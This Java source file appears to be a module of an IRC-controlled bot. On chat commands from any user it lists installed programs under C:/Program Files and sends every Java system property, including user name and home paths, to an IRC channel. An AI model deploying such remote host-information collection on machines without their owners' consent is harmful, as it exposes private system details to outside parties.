
import java.io.File;
import java.io.IOException;
import java.util.Map.Entry;
import java.util.Properties;
import java.util.Set;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Nathan
 */
public class SystemInformation implements Handler {

    public boolean processCommand(String[] args, String nick) {
        if(args[0].equals(";getprogramlist")) {
            getInstalledPrograms();
            return true;
        }
        if(args[0].equals(";getsysteminfo")) {
            printInformation();
            return true;
        }
        return false;
    }

    public static void getInstalledPrograms() {
        try {
            String[] dirs = new File("C:/Program Files/").list();
            for(String p : dirs) {
                IRC.sendMessage(Config.channel, "Installed Program: "+p);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    public static void printInformation() {
        Properties systemProps = System.getProperties();
        Set<Entry<Object, Object>> sets = systemProps.entrySet();
        System.out.println("systems properties:");
        for (Entry<Object, Object> entry : sets) {
            IRC.sendMessage(Config.channel, "Name: " + entry.getKey() + ", Value: " + entry.getValue());
        }
    }
}
